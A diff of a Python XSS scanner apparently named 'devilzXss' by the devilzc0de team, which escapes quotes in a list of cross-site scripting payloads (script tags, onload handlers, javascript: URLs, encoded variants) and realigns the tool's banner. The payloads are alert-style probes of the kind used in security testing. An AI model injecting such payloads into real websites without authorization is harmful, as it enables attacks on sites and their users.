@@ -100,18 +100,18 @@ xss_attack = ["%22%3Cscript%3Ealert%28%27dev%27%29%3C%2Fscript%3E"
 							");xss:expression(alert(1));border-image:url(foobar",
 							"xss'+alert(1)+'",
 							"</textarea><script>alert(/xss/)</script>",
-							"<img src="javascript:alert('XSS')">",
+							"<img src=\"javascript:alert('XSS')">",
 							"><script alert(String.fromCharCode(88,83,83))</script>",
 							"'>><marquee><h1>XSS</h1></marquee>",
 							"alert(String.fromCharCode(88,83,83));'))">",
 							"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",
-							"<BODY ONLOAD=alert("XSS")>",
-							"<BODY BACKGROUND="javascript:alert('XSS')">",
+							"<BODY ONLOAD=alert(\"XSS\")>",
+							"<BODY BACKGROUND=\"javascript:alert('XSS')">",
 							"';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",
 							"<%<!--'%><script>alert(1);</script -->",
 							"data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=",
 							"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;",
-							""><svg onload="prompt(/xss/)"></svg>"]
+							"\"><svg onload=\"prompt(/xss/)\"></svg>"]
 
 
 class MyOpener(FancyURLopener):
@@ -185,11 +185,11 @@ def xxs2(exploi):
 
 print("\t\033[1;31m	/--------------------------//	\033[1;m")
 print("\t\033[1;31m	|          devilzXss       ||	\033[1;m")
-print("\t\033[1;31m |     By devilzc0de team   ||	\033[1;m")
-print("\t\033[1;31m |                          ||	\033[1;m")
+print("\t\033[1;31m	|     By devilzc0de team   ||	\033[1;m")
+print("\t\033[1;31m	|                          ||	\033[1;m")
 print("\t\033[1;31m	|       Beta Version       |/ 	\033[1;m")
-print("\t\033[1;31m |      devilzc0de.org      /	\033[1;m")
-print("\t\033[1;31m '--------------------------' 	\033[1;m")
+print("\t\033[1;31m	|      devilzc0de.org      /	\033[1;m")
+print("\t\033[1;31m	'--------------------------' 	\033[1;m")
 
 
 print("\033[1;35m These types of URLs are accepted\033[1;m")
